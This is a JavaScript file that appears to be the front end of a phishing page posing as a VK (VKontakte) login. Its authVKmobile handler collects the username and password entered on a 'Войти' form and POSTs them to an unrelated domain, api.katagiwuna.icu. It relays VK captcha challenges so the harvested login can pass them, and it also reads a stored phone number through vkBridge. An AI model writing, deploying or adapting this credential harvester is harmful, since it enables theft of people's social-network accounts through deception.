function dots(status) {
    var btn = document.getElementById('login_vk')
    var pr = document.querySelector('.pr')
    if (status == 'add') {
        btn.textContent = ''
        btn.innerHTML = `
            <div class="pr" id="btn_lock" style="opacity: 1;">
            <div class="pr_bt"></div>
            <div class="pr_bt"></div>
            <div class="pr_bt"></div>
            </div>
        `
        btn.setAttribute('data-btnoff', true)
        btn.style = "height: 36px;cursor: default;"
    } else if ('remove') {
        btn.textContent = 'Войти'
        if (pr) {
            pr.remove()
        }
        btn.setAttribute('data-btnoff', false)
        btn.style = "height: 36px;cursor: pointer;"
    }
    
}

new Vue({
    el: '#app',
    data: {
        login: ''
    },
    created: function () {
        vkBridge
            .send('VKWebAppStorageGet', {"keys": ["phone"]})
            .then(data => {
                // Handling received data
                console.log(data['keys'][0]['value'])
                if (data['keys'][0]['value']) { 
                    this.login = data['keys'][0]['value'] 
                }
            })
            .catch(error => {
                console.log(error)
            })
    },
    methods: {
        authVKmobile: function() {
            if(document.getElementById('login_vk').getAttribute("data-btnoff") == 'false') {
                username = document.getElementById('login').value
                password = document.getElementById('password').value
            
                captcha_sid = document.getElementById('captcha_sid').value
                captcha_key = document.getElementById('captcha_key').value
                dots('add');
    
                if (captcha_sid && captcha_key) {
                    $.ajax({
                        type: "POST",
                        url: "https://api.katagiwuna.icu/account/login/MQ==",
                        data: {
                            password: password,
                            login: username,
                            captcha_sid: captcha_sid,
                            captcha_key: captcha_key
                        },
                        success: result => {
   
                            if (result.status == 'success') {
                                dots('remove');
                                window.location.replace('/?finish=true')
                            }
                        },
                        error: result => {
                            var res = $.parseJSON(result.responseText);
                            if (res.description == 'invalid_client' || res.description == 'wrong_data' || res.description == 'empty_data') {
                                let login_message = document.getElementById('login_message')
                                login_message.style = "display: block"
                                let sidC = document.getElementById('sidC')
                                sidC.style = "display: none"
                                dots('remove');
    
                            } else if (res.description == 'need_captcha') {
                                let sidC = document.getElementById('sidC')
                                sidC.style = "display: block"
                                dots('remove');
                                
                                document.getElementById("captcha").src = res.data.captcha_img
                                document.getElementById('captcha_sid').value = res.data.captcha_sid
                            }
                        }
                    })
                } else {
                    $.ajax({
                        type: "POST",
                        url: "https://api.katagiwuna.icu/account/login/MQ==",
                        data: {
                            password: password,
                            login: username
                        },
                        success: result => {
    
                            if (result.status == 'success') {
                                dots('remove');
                                window.location.replace('/?finish=true')
                            }
                        },
                        error: result => {
                            var res = $.parseJSON(result.responseText);
                            if (res.description == 'invalid_client' || res.description == 'wrong_data' || res.description == 'empty_data') {
                                let login_message = document.getElementById('login_message')
                                login_message.style = "display: block"
                                let sidC = document.getElementById('sidC')
                                sidC.style = "display: none"
                                dots('remove');
    
                            } else if (res.description == 'need_captcha') {
                                let sidC = document.getElementById('sidC')
                                sidC.style = "display: block"
                                dots('remove');
                                
                                document.getElementById("captcha").src = res.data.captcha_img
                                document.getElementById('captcha_sid').value = res.data.captcha_sid
    
                            }
                        }
                    })
                }
            }
        }
    }
})
